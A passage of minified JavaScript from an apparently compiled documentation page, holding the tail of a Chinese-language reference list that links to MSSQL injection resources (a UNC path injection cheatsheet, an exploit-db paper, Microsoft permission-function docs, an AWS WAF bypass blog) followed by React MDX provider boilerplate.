\u65e5"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://github.com/NetSPI/DAFT",children:"DAFT\uff1a\u6570\u636e\u5e93\u5ba1\u8ba1\u6846\u67b6\u548c\u5de5\u5177\u5305-NetSPI"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e",children:"SQL Server UNC \u8def\u5f84\u6ce8\u5165 Cheatsheet-nullbind"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://www.exploit-db.com/papers/12975",children:"\u5b8c\u6574 MSSQL \u6ce8\u5165 PWNage-ZeQ3uL&&JabAv0C-2009 \u5e74 1 \u6708 28 \u65e5"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://docs.microsoft.com/en-us/sql/relational-databases/system-functions/sys-fn-my-permissions-transact-sql?view=sql-server-ver15",children:"Microsoft-sys.fn_my_permissions\uff08Transact-SQL\uff09"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15",children:"Microsoft-IS_SRVROLEMEMBER\uff08Transact-SQL\uff09"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/",children:"\u7531\u4e8e\u9009\u62e9\u4e86 Unorthodox MSSQL \u8bbe\u8ba1\uff0cAWS WAF \u5ba2\u6237\u7aef\u6613\u53d7 SQL \u6ce8\u5165\u653b\u51fb-Marc Olivier Bergeron-2023 \u5e74 6 \u6708 21 \u65e5"})}),"\n"]})]})}function h(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>t,x:()=>a});var l=n(6540);const r={},i=l.createContext(r);function t(e){const s=l.useContext(i);return l.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),l.createElement(i.Provider,{value:s},e.children)}}}]);